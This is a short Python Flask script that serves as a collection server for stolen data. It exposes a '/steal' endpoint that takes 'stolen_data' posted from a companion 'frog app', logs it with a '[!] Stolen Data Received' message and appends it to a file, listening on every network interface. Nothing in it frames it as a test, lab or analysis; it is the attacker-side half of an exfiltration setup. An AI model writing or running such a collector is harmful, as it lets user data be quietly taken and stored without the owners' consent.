#


from flask import Flask, request

app = Flask(__name__)

# Route that receives data from your frog app
@app.route('/steal', methods=['POST'])
def steal_data():
    stolen_data = request.json.get("stolen_data", "No Data")
    print(f"[!] Stolen Data Received: {stolen_data}")
    with open("stolen_data.txt", "a") as file:
        file.write(stolen_data + "\\n")
    return {"status": "received"}, 200

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5001)
